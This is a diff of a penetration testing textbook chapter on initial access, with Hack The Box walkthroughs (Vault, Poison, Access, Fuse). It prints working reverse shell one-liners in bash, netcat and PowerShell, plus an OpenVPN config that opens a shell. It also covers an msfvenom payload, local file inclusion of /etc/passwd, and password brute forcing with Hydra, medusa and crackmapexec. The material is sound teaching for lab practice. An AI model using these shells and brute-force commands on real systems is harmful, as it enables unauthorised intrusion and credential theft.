@@ -22,20 +22,20 @@ Custom Exploitation
 * Phishing with malware
 * Reverse/bind shells
 * Remote command execution
-* Injection \(Databases and Files\)
+* Injection (Databases and Files)
 * Buffer overflows
 
 This is not an exhaustive classification and the main point to take from it are the different approaches. In the first class, using External Remote Services, the attacker is "living off the land" by using legitimate tools for their attack. In the second, they are crafting a custom exploitation of a vulnerability to gain unintended access.
 
 Before we start looking at these methods of access, we need to review how Linux and Windows provide an interface to the operating system through their respective command terminals or command shells.
 
-![Principles of a remote shell redirecting stdin, stdout and stderror over a network socket](../.gitbook/assets/0%20%282%29.png)
+![Principles of a remote shell redirecting stdin, stdout and stderror over a network socket](<../.gitbook/assets/0 (2).png>)
 
 This entire process is made simpler through the use of a program called Netcat that can handle the IO redirection for a program over a network. In what is called a “reverse shell”, you start a Netcat session on a local machine to listen for incoming connections:
 
 `nc -lvnp 6001`
 
-This tells netcat to listen \(-l\) on port \(-p\) 6001 \(any number port that is not being used\) on all IP addresses for incoming connections \(-v is for verbose output, -n is for no DNS\). On the target machine, you can run:
+This tells netcat to listen (-l) on port (-p) 6001 (any number port that is not being used) on all IP addresses for incoming connections (-v is for verbose output, -n is for no DNS). On the target machine, you can run:
 
 `nc <listen machine IP> 6001 -e /bin/bash`
 
@@ -47,7 +47,7 @@ Netcat is one tool to create a reverse shell. There are numerous other ways of a
 
 `bash -i >& /dev/tcp/10.0.0.1/6001 0>&1`
 
-Although this looks complicated, it is running a bash shell in interactive mode \(-i\) and redirecting stdout and stderr \(&gt;&\) to a socket that will connect to the address and port specified \(/dev/tcp/10.0.0.1/6001\). The final redirection command \(0&gt;&1\) redirects stdin to the same file as stdout i.e. the socket.
+Although this looks complicated, it is running a bash shell in interactive mode (-i) and redirecting stdout and stderr (>&) to a socket that will connect to the address and port specified (/dev/tcp/10.0.0.1/6001). The final redirection command (0>&1) redirects stdin to the same file as stdout i.e. the socket.
 
 At the other end, you can still use Netcat in listening mode to handle the incoming connection.
 
@@ -83,7 +83,7 @@ The principles of reverse shells work with Windows as well but you don’t have 
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",6001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-When the code passed to powershell.exe's command argument \(-Command\) is expanded, it looks like this:
+When the code passed to powershell.exe's command argument (-Command) is expanded, it looks like this:
 
 ```python
 New-Object System.Net.Sockets.TCPClient("10.0.0.1",6001)
@@ -105,7 +105,7 @@ As with all things Windows, this is slightly more complicated than the Linux ver
 
 ## Upgrading Remote Shells
 
-The shells obtained by the methods outlined sometimes are less than functional because they do not result in a full ‘TTY’ terminal. TTY stands for teletype and is derived from the early electromagnetic typewriters that were used in telegraphy and then to communicate with mainframes and minicomputers. When you open a terminal on a Mac or on Linux, the terminal software is running a pseudo teletype \(PTY\) which handles getting input from the keyboard and passing it to a TTY driver which eventually passes that data to which ever shell program you are running. The terminal handles things like arrow keys and key sequences like "control + w" which will erase a word, "control + c" which will kill the last command you ran. If you are not running a proper TTY, you won't be able to use arrow keys and "CTL+c" will kill the shell you are running and not the last command. Also using an editor like vi will be difficult.
+The shells obtained by the methods outlined sometimes are less than functional because they do not result in a full ‘TTY’ terminal. TTY stands for teletype and is derived from the early electromagnetic typewriters that were used in telegraphy and then to communicate with mainframes and minicomputers. When you open a terminal on a Mac or on Linux, the terminal software is running a pseudo teletype (PTY) which handles getting input from the keyboard and passing it to a TTY driver which eventually passes that data to which ever shell program you are running. The terminal handles things like arrow keys and key sequences like "control + w" which will erase a word, "control + c" which will kill the last command you ran. If you are not running a proper TTY, you won't be able to use arrow keys and "CTL+c" will kill the shell you are running and not the last command. Also using an editor like vi will be difficult.
 
 Shells can be upgraded by using the pty library in python:
 
@@ -128,7 +128,7 @@ stty rows <num> columns <cols>
 
 ## SSH
 
-Secure Shell \(SSH\) operates in a client server configuration with the server usually listening on TCP port 22. Normally, the process for a client connecting to a remote machine involves using either a password or a private key. Keys are generated using ssh-keygen which by default will use RSA as the algorithm. Running ssh-keygen will produce a private key and a public key. The public key is added to a file "authorized\_keys" normally located in the .ssh directory in the user's home directory. The private key is then held by the user on their client machine. SSH also supports password access. Although it is not normal to find a private key in the .ssh directory on the server, it is always worth checking, using the default filename for the private key "id\_rsa".
+Secure Shell (SSH) operates in a client server configuration with the server usually listening on TCP port 22. Normally, the process for a client connecting to a remote machine involves using either a password or a private key. Keys are generated using ssh-keygen which by default will use RSA as the algorithm. Running ssh-keygen will produce a private key and a public key. The public key is added to a file "authorized\_keys" normally located in the .ssh directory in the user's home directory. The private key is then held by the user on their client machine. SSH also supports password access. Although it is not normal to find a private key in the .ssh directory on the server, it is always worth checking, using the default filename for the private key "id\_rsa".
 
 As an added layer of protection, SSH private keys can be encrypted. John The Ripper will extract a hash from the encrypted SSH key with a program called "sshng2john.py".
 
@@ -158,7 +158,7 @@ ssh -L 8000:127.0.0.1:8000 user@remoteserver.htb
 
 From the local machine, you can access the remote server by once again using the URL [http://127.0.0.1:8000](http://127.0.0.1:8000).
 
-A tunnel can be created without actually logging into the machine \(i.e. not running a shell\) by specifying the -N flag.
+A tunnel can be created without actually logging into the machine (i.e. not running a shell) by specifying the -N flag.
 
 #### Dynamic Port Forwarding
 
@@ -211,7 +211,7 @@ Welcome to the Slowdaddy web interface
 
 We specialize in providing finanancial organisations with strong web and database solutions and we promise to keep your customers financial data safe.
 
-We are proud to announce our first client: Sparklays \(Sparklays.com still under construction\)
+We are proud to announce our first client: Sparklays (Sparklays.com still under construction)
 
 Running Gobuster, but with a modified wordlist to add "sparklays" and "Sparklays", you find the sub-directory "sparklays". Running gobuster on this directory reveals the following sub-directories and files:
 
@@ -301,7 +301,7 @@ We can now do a local port forward to get access to port 80 on the box 192.168.1
 dave@vault.htb's password:
 ```
 
-This then allows us to navigate to the web site at [http://127.0.0.1:8081](http://127.0.0.1:8081) where you get links related to DNS and VPN configuration \(Figure 3-4\).
+This then allows us to navigate to the web site at [http://127.0.0.1:8081](http://127.0.0.1:8081) where you get links related to DNS and VPN configuration (Figure 3-4).
 
 ![Home page on port 8081](../.gitbook/assets/vault2.png)
 
@@ -319,7 +319,7 @@ script-security 2
 up ​"/bin/bash -c '/bin/bash -I > /dev/tcp/192.168.122.1/6002 0<&1 2>&1&'"
 ```
 
-Rather than run the Netcat listener on the Vault machine however, you can use another SSH remote port forwarder to tunnel the shell back to our local machine. To do this from an existing SSH session, you can use the special characters **~C** at the beginning of the command prompt to drop into an SSH prompt and then set up the remote port forward:
+Rather than run the Netcat listener on the Vault machine however, you can use another SSH remote port forwarder to tunnel the shell back to our local machine. To do this from an existing SSH session, you can use the special characters **\~C** at the beginning of the command prompt to drop into an SSH prompt and then set up the remote port forward:
 
 ```bash
 dave@ubuntu:~$
@@ -422,15 +422,15 @@ uid avid <dave@david.com>
 sub 4096R/D1EB1F03 2018-07-24
 ```
 
-We can use scp \(SSH copy utility\) to copy the file onto the DNS box and then onto the ubuntu machine and decrypt using gpg and the passphrase "itscominghome" that you found in the file called Key earlier.
+We can use scp (SSH copy utility) to copy the file onto the DNS box and then onto the ubuntu machine and decrypt using gpg and the passphrase "itscominghome" that you found in the file called Key earlier.
 
 ## Remote Desktop Protocol
 
-Remote Desktop Protocol \(RDP\) allows user to access their desktop from another machine over a network using the RDP client. The RDP server listens on TCP and UDP port 3389 by default. Users are permitted to use RDP are those in the Remote Desktop Users group. RDP access is one way hackers will gain initial access to a machine if they have a user's credentials. It can also be used to establish persistence, i.e. an easy way to regain access at some later point. In this case, a new user can be created and added to the relevant groups to allow remote desktop access.
+Remote Desktop Protocol (RDP) allows user to access their desktop from another machine over a network using the RDP client. The RDP server listens on TCP and UDP port 3389 by default. Users are permitted to use RDP are those in the Remote Desktop Users group. RDP access is one way hackers will gain initial access to a machine if they have a user's credentials. It can also be used to establish persistence, i.e. an easy way to regain access at some later point. In this case, a new user can be created and added to the relevant groups to allow remote desktop access.
 
 RDP is also susceptible to man-in-the-middle attacks. Using software such as Seth[\[3\]](initial-access.md). When Remote Desktop Connection connects through to a machine, it will throw up an error if there is a problem with the TLS certificate. However, it does this with the default self-signed certificate and users are normally used to just ignoring the warning and clicking through. Another issue with man-in-the-middle is if RDP is configured to use Network Level Authentication which Seth is not able to handle. In this scenario, Seth will still be able to capture the plaintext password that was entered into the login screen for the RDP connection, but the connection will then die.
 
-There have been a number of exploits of RDP with the most significant recent exploit being BlueKeep \(CVE-2019-0708\) which allowed remote code execution through RDP on Windows 7 and Windows Server 2008 machines.
+There have been a number of exploits of RDP with the most significant recent exploit being BlueKeep (CVE-2019-0708) which allowed remote code execution through RDP on Windows 7 and Windows Server 2008 machines.
 
 RDP does not feature in Hack The Box machines, mainly because in the past, it would have been hard to support the many users accessing RDP all at the same time on a VM. However, this is an important technique in an attacker's arsenal and so MITRE for example lists numerous malicious hacker groups as using it to gain access and for lateral movement [\[4\]](initial-access.md).
 
@@ -498,19 +498,19 @@ In this scenario, Network Level Authentication had been configured and so Seth w
 
 ### VNC
 
-VNC is an alternative to RDP that is platform independent. VNC uses the Remote Frame Buffer protocol \(RFB\). It is usually configured to run on ports 5900+N were N is the display number. Whilst RFB is not a secure protocol, VNC can be run through an SSH or VPN tunnel making it secure.
+VNC is an alternative to RDP that is platform independent. VNC uses the Remote Frame Buffer protocol (RFB). It is usually configured to run on ports 5900+N were N is the display number. Whilst RFB is not a secure protocol, VNC can be run through an SSH or VPN tunnel making it secure.
 
 VNC hasn't been the most robust of products and there are numerous serious vulnerabilities in a range of different versions of the product.
 
-VNC may require password but if used, it doesn't need a username. Metasploit has a VNC login brute force module \(auxiliary/scanner/vnc/vnc\_login\) and the command line application hydra can also brute force VNC passwords. A VNC-enabled payload can be created by msfvenom also:
+VNC may require password but if used, it doesn't need a username. Metasploit has a VNC login brute force module (auxiliary/scanner/vnc/vnc\_login) and the command line application hydra can also brute force VNC passwords. A VNC-enabled payload can be created by msfvenom also:
 
-msfvenom -p windows/vncinject/reverse\_tcp LHOST=&lt;Local Host IP address&gt; LPORT=4444 -f exe &gt; payload.exe
+msfvenom -p windows/vncinject/reverse\_tcp LHOST=\<Local Host IP address> LPORT=4444 -f exe > payload.exe
 
 Finally, meterpreter can launch a VNC session by running "run vnc" within a meterpreter session.
 
 ### Exercise: Exploiting VNC for initial access in Hack The Box machine Poison
 
-An nmap scan shows that this machine is running FreeBSD and has port 22 \(SSH\) and port 80 \(HTTP\) open.
+An nmap scan shows that this machine is running FreeBSD and has port 22 (SSH) and port 80 (HTTP) open.
 
 ```bash
 ┌─[✗]─[rin@parrot]─[~/boxes/Poison]
@@ -526,7 +526,7 @@ PORT STATE SERVICE VERSION
 Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
 ```
 
-Navigating to the website, there is a home page suggesting that various PHP files can be tested \(Figure 4-6\).
+Navigating to the website, there is a home page suggesting that various PHP files can be tested (Figure 4-6).
 
 ![Home page of Poison machine](../.gitbook/assets/poison1.png)
 
@@ -562,7 +562,7 @@ Going back to the home page, the input to the text box is simply being passed as
 http://poison.htb/browse.php?file=listfiles.php
 ```
 
-This looks like a candidate for local file inclusion \(LFI\) by tampering with the file parameter. If we try the URL
+This looks like a candidate for local file inclusion (LFI) by tampering with the file parameter. If we try the URL
 
 ```bash
 http://poison.htb/browse.php?file=/etc/passwd
@@ -726,15 +726,15 @@ Which launches a VNC session as root
 
 
 
-VNC's encryption of passwords is more obfuscation than encryption as the key that is used for the DES encryption is well known. It is trivial to find an application that will decrypt the password in the file "secret" and it turns out to be "VNCP@$$!".
+VNC's encryption of passwords is more obfuscation than encryption as the key that is used for the DES encryption is well known. It is trivial to find an application that will decrypt the password in the file "secret" and it turns out to be "VNCP@\$$!".
 
 ## Telnet and FTP
 
 ### Telnet
 
-Telnet is an old protocol that provides a command-line interface via remote access. The telnet server usually listens on TCP port 23. Because it was never designed with security in mind, it is less used for administration purposes on computers but is still used on network devices and Internet of Things devices. A large number of IoT devices have shipped with default passwords set for Telnet access allowing attackers to access and take over the devices to enlist them in "botnets". Botnets are a collection of devices all running similar software/malware that can be coordinated in an attack like a Distributed Denial of Service \(DdoS\).
+Telnet is an old protocol that provides a command-line interface via remote access. The telnet server usually listens on TCP port 23. Because it was never designed with security in mind, it is less used for administration purposes on computers but is still used on network devices and Internet of Things devices. A large number of IoT devices have shipped with default passwords set for Telnet access allowing attackers to access and take over the devices to enlist them in "botnets". Botnets are a collection of devices all running similar software/malware that can be coordinated in an attack like a Distributed Denial of Service (DdoS).
 
-What commands are supported by the telnet server depends on the platform. On windows for example, it will be the cmd.exe commands that are supported. On a Cisco network switch, you will be presented with the Cisco CLI \(Command Line Interface\). In this regard, it is similar to SSH in running a specific shell after a successful login.
+What commands are supported by the telnet server depends on the platform. On windows for example, it will be the cmd.exe commands that are supported. On a Cisco network switch, you will be presented with the Cisco CLI (Command Line Interface). In this regard, it is similar to SSH in running a specific shell after a successful login.
 
 ### FTP
 
@@ -746,7 +746,7 @@ The trouble with active mode is that clients are often behind firewalls or on a 
 
 Access is a Windows box that has an FTP server on which you will find a backup of an MS Access database and a password-protected ZIP file containing a backup of a Microsoft Outlook email file. Dumping the Access database give server usernames and passwords, one of which can be used to unzip the ZIP file. Viewing the emails in the PST file found there, gives another password that can be used to gain access via Telnet.
 
-An nmap scan shows that the TCP ports 21 \(FTP\), 23 \(Telnet\) and 80 \(HTTP\) are open. Nmap tells you that anonymous login is allowed on FTP.
+An nmap scan shows that the TCP ports 21 (FTP), 23 (Telnet) and 80 (HTTP) are open. Nmap tells you that anonymous login is allowed on FTP.
 
 ```bash
 ┌─[✗]─[rin@parrot]─[~/boxes/Access]
@@ -875,11 +875,11 @@ It won't be long before you notice that the shell that Telnet provides is limite
 
 ## Brute forcing remote service passwords
 
-We have already come across some examples of brute forcing passwords \(and usernames\) but we are going to go into the subject a bit more deeply here and look one tool in particular THC Hydra to brute force a variety of remote services. First, it is worth mentioning some background about passwords. The perceived wisdom about passwords has changed with the main recommendation for passwords being length and not complexity \(NIST SP 800-63B \([https://pages.nist.gov/800-63-3/sp800-63b.html\)\](https://pages.nist.gov/800-63-3/sp800-63b.html%29\)\). The determination was that adding rules about specific characters and complexity only added a burden on users to remember the password and led to behaviors where users used patterns to choose their passwords. The advent of highly efficient offline password hashing and checking computers along with millions of available breached passwords has led to the increased possibility of a password being brute forced.
+We have already come across some examples of brute forcing passwords (and usernames) but we are going to go into the subject a bit more deeply here and look one tool in particular THC Hydra to brute force a variety of remote services. First, it is worth mentioning some background about passwords. The perceived wisdom about passwords has changed with the main recommendation for passwords being length and not complexity (NIST SP 800-63B ([https://pages.nist.gov/800-63-3/sp800-63b.html)\\](https://pages.nist.gov/800-63-3/sp800-63b.html\)/)). The determination was that adding rules about specific characters and complexity only added a burden on users to remember the password and led to behaviors where users used patterns to choose their passwords. The advent of highly efficient offline password hashing and checking computers along with millions of available breached passwords has led to the increased possibility of a password being brute forced.
 
-Password hashing depends on the use of a mathematical function that is called a one-way function. It is easy to calculate the hash of a piece of plain text but almost impossible to generate the text from the hash. Hashes are also of fixed length, so no matter how long the piece of text being hashed, the hash itself is always the same length. In the case of the SHA-512 hashing algorithm commonly used on modern Linux-based systems, the output is 64 bytes long. If the only thing that was done with a password was to take the plain text and hash it, it would not be very secure. This is because it would be possible to use tables of pre-computed hashes, called rainbow tables\) for millions of common passwords and compare them to the hash to get a match. That process would be very fast. Even without the rainbow tables, doing a brute force on a dictionary of words by hashing each word and comparing it with the hash we want to crack would also be very fast, especially on modern computers with Graphical Processing Units \(GPUs\).
+Password hashing depends on the use of a mathematical function that is called a one-way function. It is easy to calculate the hash of a piece of plain text but almost impossible to generate the text from the hash. Hashes are also of fixed length, so no matter how long the piece of text being hashed, the hash itself is always the same length. In the case of the SHA-512 hashing algorithm commonly used on modern Linux-based systems, the output is 64 bytes long. If the only thing that was done with a password was to take the plain text and hash it, it would not be very secure. This is because it would be possible to use tables of pre-computed hashes, called rainbow tables) for millions of common passwords and compare them to the hash to get a match. That process would be very fast. Even without the rainbow tables, doing a brute force on a dictionary of words by hashing each word and comparing it with the hash we want to crack would also be very fast, especially on modern computers with Graphical Processing Units (GPUs).
 
-To prevent these types of attacks, password hashing uses a salt, a piece of random text that is up to 16 characters long \(for the SHA-512 hashing algorithm\) and adds that to the password and hashes that. However, it doesn't just do this one, it does it a minimum of 1,000 times taking the product of each round and adding it back in a variety of ways. The aim of this process is to make the calculation of hashes computationally expensive i.e. to slow it down.
+To prevent these types of attacks, password hashing uses a salt, a piece of random text that is up to 16 characters long (for the SHA-512 hashing algorithm) and adds that to the password and hashes that. However, it doesn't just do this one, it does it a minimum of 1,000 times taking the product of each round and adding it back in a variety of ways. The aim of this process is to make the calculation of hashes computationally expensive i.e. to slow it down.
 
 Of course, not all password hashes are generated in this way and despite the improvements in hashing algorithms, it is still possible to brute force passwords if they are short and are a common dictionary word.
 
@@ -934,21 +934,21 @@ egrep is an alias for grep -E which supports extended regular expressions. Regul
 egrep '^[^[:upper:]]{6,7}$' passwords.txt
 ```
 
-The expression \[\[:upper:\]\] matches uppercase letters and the ^ within the \[\] means 'not'.
+The expression \[\[:upper:]] matches uppercase letters and the ^ within the \[] means 'not'.
 
 The approach of taking a password list and refining it certainly makes the process of cracking faster, provided the password you are looking for is in the list. However, even though a person may use a common password, they will often change it by altering numbers at the end, either a sequence or referring to a specific date for example. A fan of the French soccer team may have the password France2018 representing one of the years that France won the FIFA World Cup.
 
-The tool CUPP \(Common User Passwords Profiler\) \([https://github.com/Mebus/cupp\](https://github.com/Mebus/cupp\)\) will ask a series of questions about a target to create a set of possible password combinations. Of course this relies on having access to personal information about the target such as their family members' names, dates of birth, pet names, work and hobbies.
+The tool CUPP (Common User Passwords Profiler) ([https://github.com/Mebus/cupp\\](https://github.com/Mebus/cupp/)) will ask a series of questions about a target to create a set of possible password combinations. Of course this relies on having access to personal information about the target such as their family members' names, dates of birth, pet names, work and hobbies.
 
-Another approach is to crawl a company website for potential words that could be used as a password using a tool like CeWL \(Custom Word List Generator [https://digi.ninja/projects/cewl.php\](https://digi.ninja/projects/cewl.php\)\). Again, this isn't sophisticated, it just takes words that it finds and creates a password list.
+Another approach is to crawl a company website for potential words that could be used as a password using a tool like CeWL (Custom Word List Generator [https://digi.ninja/projects/cewl.php\\](https://digi.ninja/projects/cewl.php/)). Again, this isn't sophisticated, it just takes words that it finds and creates a password list.
 
-Once you have a wordlist, you can use tools to take the words and create different combinations to create a more extensive list of passwords. One of these is Mentalist \(git clone [https://github.com/sc0tfree/mentalist.git\](https://github.com/sc0tfree/mentalist.git\)\) which allows you to take a wordlist and then apply a chain of transformations that will do things like change case, substitute numbers for letters and other substitutions \(e.g. zero instead of the letter O, 3 instead of e, 5 instead of s\) and to take things like zip or postal codes and other words and prepend or postpend them to the word. You can either use this to generate a new dictionary to use for cracking, or create a set of rules that can be directly used by John The Ripper or Hashcat.
+Once you have a wordlist, you can use tools to take the words and create different combinations to create a more extensive list of passwords. One of these is Mentalist (git clone [https://github.com/sc0tfree/mentalist.git\\](https://github.com/sc0tfree/mentalist.git/)) which allows you to take a wordlist and then apply a chain of transformations that will do things like change case, substitute numbers for letters and other substitutions (e.g. zero instead of the letter O, 3 instead of e, 5 instead of s) and to take things like zip or postal codes and other words and prepend or postpend them to the word. You can either use this to generate a new dictionary to use for cracking, or create a set of rules that can be directly used by John The Ripper or Hashcat.
 
 We will go through an example of generating a custom word list in a moment, but first we can turn to tools for testing passwords directly with an application online. This has become much more challenging recently with improvements in applications that will lock users out after a small number of failed login attempts. However, it can still work where these protections have not been applied, websites with poor security practices, services that do not have the means for password protections of this sort and devices like the Internet of Things where again, password protection is not implemented by default.
 
 ## Online Password Brute Force
 
-We have already seen a number of tools that can be used to test usernames and passwords for specific remote services. The most comprehensive of these is THC Hydra \([https://github.com/vanhauser-thc/thc-hydra\](https://github.com/vanhauser-thc/thc-hydra\)\) which supports more than 50 different protocols. The basic syntax of Hydra is illustrated in the examples printed out with the use of hydra -h
+We have already seen a number of tools that can be used to test usernames and passwords for specific remote services. The most comprehensive of these is THC Hydra ([https://github.com/vanhauser-thc/thc-hydra\\](https://github.com/vanhauser-thc/thc-hydra/)) which supports more than 50 different protocols. The basic syntax of Hydra is illustrated in the examples printed out with the use of hydra -h
 
 ```bash
 hydra -l user -P passlist.txt ftp://192.168.0.1
@@ -964,11 +964,11 @@ The -l and -p flags expect a username and password respectively. The capital ver
 <protocol>://<IP Address>:<Port>/<Protocol Options>
 ```
 
-**&lt;protocol&gt;** will be the type of service such as http, smb, ftp pop3. The port can be specified in addition to the IP address although the default port will be used if this is omitted. Finally, there is the ability to specify particular authentication variants as part of the protocol specification.
+**\<protocol>** will be the type of service such as http, smb, ftp pop3. The port can be specified in addition to the IP address although the default port will be used if this is omitted. Finally, there is the ability to specify particular authentication variants as part of the protocol specification.
 
 Medusa is another tool, like hydra, which will allow the brute forcing of a range of different services but it has been largely unmaintained since 2015.
 
-Metasploit also has a number of scanners for services such as FTP, SMB and SSH that will do brute force logins as well. There are also other tools such as Crackmapexec which supports a few protocols such as SMB, HTTP and MSSQL \(Microsoft SQL Server\).
+Metasploit also has a number of scanners for services such as FTP, SMB and SSH that will do brute force logins as well. There are also other tools such as Crackmapexec which supports a few protocols such as SMB, HTTP and MSSQL (Microsoft SQL Server).
 
 As we will see however, all of these tools respond differently to different settings and protocols and so it is possible to get both false positives and negatives. Checking with another tool is always a good idea.
 
@@ -1039,7 +1039,7 @@ Host script results:
 |_ start_date: 2020-12-21T03:35:26
 ```
 
-The OS discovery suggests that the box is a Windows Server 2016. The variety of ports like DNS, LDAP and Kerberos suggest that it is an Active Directory domain controller with the domain fabricorp.local. We can add this hostname to the /etc/hosts file. An interesting note at this point is whether add the fabricorp.local DNS to the list of nameservers to query so that any other subdomains would be accessible automatically. You can normally do this by adding the entry nameserver &lt;IP address&gt; to the file /etc/resolv.conf. However, in this case, the DNS returned the incorrect IP address for fabricorp.local and so this is not an option.
+The OS discovery suggests that the box is a Windows Server 2016. The variety of ports like DNS, LDAP and Kerberos suggest that it is an Active Directory domain controller with the domain fabricorp.local. We can add this hostname to the /etc/hosts file. An interesting note at this point is whether add the fabricorp.local DNS to the list of nameservers to query so that any other subdomains would be accessible automatically. You can normally do this by adding the entry nameserver \<IP address> to the file /etc/resolv.conf. However, in this case, the DNS returned the incorrect IP address for fabricorp.local and so this is not an option.
 
 Going to the website, we get redirected to the URL [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm) and so we can add fuse.fabricorp.local to the /etc/hosts file as well. This gives us a page shown here:
 
@@ -1059,13 +1059,13 @@ bhult
 administrator
 ```
 
-We can add these to a file users.txt and use a program kerbrute to check if these users exist on the fabricorp.local domain. 
+We can add these to a file users.txt and use a program kerbrute to check if these users exist on the fabricorp.local domain.&#x20;
 
 {% hint style="info" %}
 To get kerbrute, you can download a release from [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute).
 {% endhint %}
 
- Running this with the users listed above, we get:
+&#x20;Running this with the users listed above, we get:
 
 ```bash
 ┌─[✗]─[rin@parrot]─[~/boxes/Fuse]
@@ -1096,7 +1096,7 @@ http://fuse.fabricorp.local/papercut/logs/html/index.htm
 CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
 ```
 
-We have specified a depth of 3 \(-d 3\) for the program to crawl, a minimum password length of 8 \(-m 8\), we want words that contain numbers \(--with-numbers\) and an output file fabricorp\_wordlist.txt and the URL of the home page we want to crawl. This generates a wordlist of the type:
+We have specified a depth of 3 (-d 3) for the program to crawl, a minimum password length of 8 (-m 8), we want words that contain numbers (--with-numbers) and an output file fabricorp\_wordlist.txt and the URL of the home page we want to crawl. This generates a wordlist of the type:
 
 ```bash
 ┌─[rin@parrot]─[~/boxes/Fuse]
@@ -1135,7 +1135,7 @@ SMB 10.129.2.5 445 FUSE [-] fabricorp.local\tlavel:Fabricorp01
     STATUS_PASSWORD_MUST_CHANGE
 ```
 
-An alternative to crackmapexec is medusa which can be used with the the user file \(-U users.txt\), the password file \(-P fabricorp\_wordlist.txt\) and the SMB NT module \(-M smbnt\). This gives the following output:
+An alternative to crackmapexec is medusa which can be used with the the user file (-U users.txt), the password file (-P fabricorp\_wordlist.txt) and the SMB NT module (-M smbnt). This gives the following output:
 
 ```bash
 ┌─[rin@parrot]─[~/boxes/Fuse]
@@ -1223,7 +1223,7 @@ We can collect all of the users and create a new users file with these users in 
 cat rpc_users.txt | awk -F '\[|]' '{print $2}' > rpc_users2.txt
 ```
 
-The awk command uses the -F flag to specify the field separator regular expression. We are separating the text between the square bracket \(\[\]\) characters. The '\' is necessary to escape the first \[. If we try and write to the same file, it will end up blank and so that is why we need to create a separate file.
+The awk command uses the -F flag to specify the field separator regular expression. We are separating the text between the square bracket (\[]) characters. The '\\' is necessary to escape the first \[. If we try and write to the same file, it will end up blank and so that is why we need to create a separate file.
 
 Back on rpcclient, we can look at printers that might be shared by using the enumprinters command. This gives output which contains a password:
 
@@ -1262,4 +1262,3 @@ Info: Establishing connection to remote endpoint
 The user flag is in c:\Users\svc-print\Desktop\users.txt.
 
 We will leave this here and come back to Fuse in a subsequent chapter where we cover further enumeration for discovery and privilege escalation. Next however we are going to explore custom exploitation as a means of gaining initial access.
-
